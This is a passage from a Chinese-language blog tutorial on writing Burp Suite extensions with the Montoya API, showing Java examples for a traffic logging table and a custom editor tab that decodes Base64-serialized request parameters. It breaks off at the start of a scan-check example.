<span class="variable">userInterface</span> <span class="operator">=</span> api.userInterface();</span><br><span class="line">        <span class="type">HttpRequestEditor</span> <span class="variable">requestViewer</span> <span class="operator">=</span> userInterface.createHttpRequestEditor(READ_ONLY);  <span class="comment">// 创建请求编辑器，设置为只读</span></span><br><span class="line">        <span class="type">HttpResponseEditor</span> <span class="variable">responseViewer</span> <span class="operator">=</span> userInterface.createHttpResponseEditor(READ_ONLY);  <span class="comment">// 创建响应编辑器，同样设置为只读</span></span><br><span class="line"></span><br><span class="line">        tabs.addTab(<span class="string">&quot;Request&quot;</span>, requestViewer.uiComponent());  <span class="comment">// 添加请求编辑器到标签页</span></span><br><span class="line">        tabs.addTab(<span class="string">&quot;Response&quot;</span>, responseViewer.uiComponent());  <span class="comment">// 添加响应编辑器到标签页</span></span><br><span class="line"></span><br><span class="line">        splitPane.setRightComponent(tabs);  <span class="comment">// 设置分割面板的右侧组件为标签页</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JTable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTable</span>(tableModel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changeSelection</span><span class="params">(<span class="type">int</span> rowIndex, <span class="type">int</span> columnIndex, <span class="type">boolean</span> toggle, <span class="type">boolean</span> extend)</span> &#123;</span><br><span class="line">                <span class="comment">// 选择表格行时显示相应的HTTP请求和响应</span></span><br><span class="line">                <span class="type">HttpResponseReceived</span> <span class="variable">responseReceived</span> <span class="operator">=</span> tableModel.get(rowIndex);</span><br><span class="line">                requestViewer.setRequest(responseReceived.initiatingRequest());</span><br><span class="line">                responseViewer.setResponse(responseReceived);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">super</span>.changeSelection(rowIndex, columnIndex, toggle, extend);  <span class="comment">// 调用父类方法处理选择逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">JScrollPane</span> <span class="variable">scrollPane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(table);  <span class="comment">// 将表格放在滚动窗格中</span></span><br><span class="line"></span><br><span class="line">        splitPane.setLeftComponent(scrollPane);  <span class="comment">// 设置分割面板的左侧组件为滚动窗格</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> splitPane;  <span class="comment">// 返回构建好的组件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 HttpHandler 接口的 MyHttpHandler 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MyTableModel tableModel; <span class="comment">// 私有最终成员变量，用于存储引用到 MyTableModel 对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，接收一个 MyTableModel 实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyHttpHandler</span><span class="params">(MyTableModel tableModel)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.tableModel = tableModel; <span class="comment">// 存储传入的 MyTableModel 对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理即将发送的 HTTP 请求的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 这个方法目前仅将请求继续传递出去，没有进行修改或其他处理</span></span><br><span class="line">        <span class="keyword">return</span> RequestToBeSentAction.continueWith(requestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理接收到的 HTTP 响应的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span></span><br><span class="line">    &#123;</span><br><span class="line">        tableModel.add(responseReceived); <span class="comment">// 将接收到的响应添加到表格模型中，用于日志记录</span></span><br><span class="line">        <span class="comment">// 这个方法也将响应继续传递出去，确保其他可能的处理器或 Burp 本身可以进一步处理响应</span></span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(responseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.HttpResponseReceived;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.table.AbstractTableModel;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承自 AbstractTableModel 的 MyTableModel 类，用于管理和显示 HTTP 响应数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTableModel</span> <span class="keyword">extends</span> <span class="title class_">AbstractTableModel</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;HttpResponseReceived&gt; log; <span class="comment">// 私有最终列表，用于存储 HttpResponseReceived 对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，初始化 log 列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyTableModel</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.log = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取表格的行数，等于 log 列表的大小</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getRowCount</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> log.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取表格的列数，这里固定为 2 列</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getColumnCount</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据列索引获取列名</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColumnName</span><span class="params">(<span class="type">int</span> column)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">switch</span> (column)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span> -&gt; <span class="string">&quot;Tool&quot;</span>; <span class="comment">// 第一列显示使用的工具</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span> -&gt; <span class="string">&quot;URL&quot;</span>;  <span class="comment">// 第二列显示请求的 URL</span></span><br><span class="line">                    <span class="keyword">default</span> -&gt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定单元格的值，用于表格显示</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Object <span class="title function_">getValueAt</span><span class="params">(<span class="type">int</span> rowIndex, <span class="type">int</span> columnIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">HttpResponseReceived</span> <span class="variable">responseReceived</span> <span class="operator">=</span> log.get(rowIndex);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">switch</span> (columnIndex)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span> -&gt; responseReceived.toolSource().toolType(); <span class="comment">// 第一列显示工具类型</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span> -&gt; responseReceived.initiatingRequest().url(); <span class="comment">// 第二列显示请求 URL</span></span><br><span class="line">                    <span class="keyword">default</span> -&gt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加一个新的 HttpResponseReceived 对象到 log 列表，并通知表格有新行插入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HttpResponseReceived responseReceived)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> log.size();</span><br><span class="line">        log.add(responseReceived);</span><br><span class="line">        fireTableRowsInserted(index, index); <span class="comment">// 触发表格更新事件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据行索引获取 HttpResponseReceived 对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HttpResponseReceived <span class="title function_">get</span><span class="params">(<span class="type">int</span> rowIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> log.get(rowIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-4.png" alt="上面创建的面板界面如图所示"></p><h2 id="Custom-Request-Editor-Tab-Example-Extension"><a href="#Custom-Request-Editor-Tab-Example-Extension" class="headerlink" title="Custom Request Editor Tab Example Extension"></a>Custom Request Editor Tab Example Extension</h2><p>Adds a new tab to Burp’s HTTP message editor, in order to handle a data serialization format</p><hr><p>This extension provides a new tab on the message editor for requests that contain a specified parameter.</p><p>The extension uses the following techniques:</p><ul><li>It creates a custom request tab on the message editor, provided that the <code>data</code> parameter is present</li><li>If it is appropriate, the editor is set to be read-only</li><li>The value of the <code>data</code> parameter is deserialized (URL decoded, then Base64 decoded) and displayed in the custom tab</li><li>If the value of the data is modified, the content will be re-serialized (Base64 encoded then URL encoded) and updated in the HttpRequest</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorCreationContext;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.HttpRequestEditorProvider;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 HttpRequestEditorProvider 接口的 MyHttpRequestEditorProvider 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHttpRequestEditorProvider</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestEditorProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api; <span class="comment">// 私有最终字段，用于存储 MontoyaApi 实例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，接收一个 MontoyaApi 实例</span></span><br><span class="line">    MyHttpRequestEditorProvider(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提供自定义的 HTTP 请求编辑器的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ExtensionProvidedHttpRequestEditor <span class="title function_">provideHttpRequestEditor</span><span class="params">(EditorCreationContext creationContext)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 返回一个新创建的 MyExtensionProvidedHttpRequestEditor 实例</span></span><br><span class="line">        <span class="comment">// 传递 MontoyaApi 实例和编辑器创建上下文</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyExtensionProvidedHttpRequestEditor</span>(api, creationContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.HttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.Selection;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.EditorOptions;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.RawEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorCreationContext;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorMode;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64EncodingOptions;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.URLUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.ByteArray.byteArray;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义 HTTP 请求编辑器实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyExtensionProvidedHttpRequestEditor</span> <span class="keyword">implements</span> <span class="title class_">ExtensionProvidedHttpRequestEditor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RawEditor requestEditor;  <span class="comment">// 原始编辑器接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Base64Utils base64Utils;  <span class="comment">// Base64工具类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> URLUtils urlUtils;  <span class="comment">// URL工具类</span></span><br><span class="line">    <span class="keyword">private</span> HttpRequestResponse requestResponse;  <span class="comment">// 当前的请求响应对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;  <span class="comment">// Montoya API 接口</span></span><br><span class="line">    <span class="keyword">private</span> ParsedHttpParameter parsedHttpParameter;  <span class="comment">// 解析的HTTP参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    MyExtensionProvidedHttpRequestEditor(MontoyaApi api, EditorCreationContext creationContext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        base64Utils = api.utilities().base64Utils();</span><br><span class="line">        urlUtils = api.utilities().urlUtils();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据编辑模式创建编辑器</span></span><br><span class="line">        <span class="keyword">if</span> (creationContext.editorMode() == EditorMode.READ_ONLY)</span><br><span class="line">        &#123;</span><br><span class="line">            requestEditor = api.userInterface().createRawEditor(EditorOptions.READ_ONLY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            requestEditor = api.userInterface().createRawEditor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取编辑后的请求</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpRequest <span class="title function_">getRequest</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        HttpRequest request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (requestEditor.isModified())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果编辑器被修改，重新序列化数据</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> base64Utils.encodeToString(requestEditor.getContents(), Base64EncodingOptions.URL);</span><br><span class="line">            <span class="type">String</span> <span class="variable">encodedData</span> <span class="operator">=</span> urlUtils.encode(base64Encoded);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新请求参数</span></span><br><span class="line">            request = requestResponse.request().withUpdatedParameters(HttpParameter.parameter(parsedHttpParameter.name(), encodedData, parsedHttpParameter.type()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            request = requestResponse.request();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置请求响应对象</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRequestResponse</span><span class="params">(HttpRequestResponse requestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.requestResponse = requestResponse;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解码参数值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">urlDecoded</span> <span class="operator">=</span> urlUtils.decode(parsedHttpParameter.value());</span><br><span class="line">        ByteArray output;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            output = base64Utils.decode(urlDecoded);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            output = byteArray(urlDecoded);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置编辑器内容</span></span><br><span class="line">        <span class="built_in">this</span>.requestEditor.setContents(output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确定编辑器是否适用于给定的请求响应</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabledFor</span><span class="params">(HttpRequestResponse requestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Optional&lt;ParsedHttpParameter&gt; dataParam = requestResponse.request().parameters().stream()</span><br><span class="line">            .filter(p -&gt; p.name().equals(<span class="string">&quot;data&quot;</span>)).findFirst();</span><br><span class="line"></span><br><span class="line">        dataParam.ifPresent(httpParameter -&gt; parsedHttpParameter = httpParameter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParam.isPresent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 编辑器的标题</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">caption</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Serialized input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取UI组件</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">uiComponent</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.uiComponent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取选中的数据</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Selection <span class="title function_">selectedData</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.selection().isPresent() ? requestEditor.selection().get() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断编辑器内容是否被修改</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isModified</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.isModified();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;  <span class="comment">// 引入 BurpExtension 接口</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;  <span class="comment">// 引入 MontoyaApi，用于访问 Burp Suite API</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 BurpExtension 接口的 CustomRequestEditorTab 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomRequestEditorTab</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置插件的名称</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Serialized input editor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 Burp 用户界面中注册自定义的 HTTP 请求编辑器提供者</span></span><br><span class="line">        <span class="comment">// MyHttpRequestEditorProvider 是一个自定义类，负责提供编辑器的具体实现</span></span><br><span class="line">        api.userInterface().registerHttpRequestEditorProvider(<span class="keyword">new</span> <span class="title class_">MyHttpRequestEditorProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码为含有参数data的请求新建了特殊的编辑器，可以对data参数进行配置修改<br><img src="/2024/10/23/tools/burpsuite-plugins/image-5.png"></p><h2 id="Custom-Scan-Checks-Example-Extension"><a href="#Custom-Scan-Checks-Example-Extension" class="headerlink" title="Custom Scan Checks Example Extension"></a>Custom Scan Checks Example Extension</h2><p>The sample extension demonstrates the following techniques:</p><ul><li>Registering a custom <code>AuditInsertionPointProvider</code></li><li>If the request contains the <code>data</code> parameter, it will provide a custom <code>AuditInsertionPoint</code></li><li>The custom <code>AuditInsertionPoint</code> will perform the following:<ul><li>Deserialize the data (URL decode and then Base64 decode)</li><li>Parse the location of the <code>input=</code> string withing the decoded data</li><li>Split the data into a prefix, location to place the payload, and a suffix</li><li>When building the request with the appropriate payload, it will perform the following:<ul><li>Build the raw data with the appropriate payload</li><li>Re-serialize the data (Base64 encode then URL encode)</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 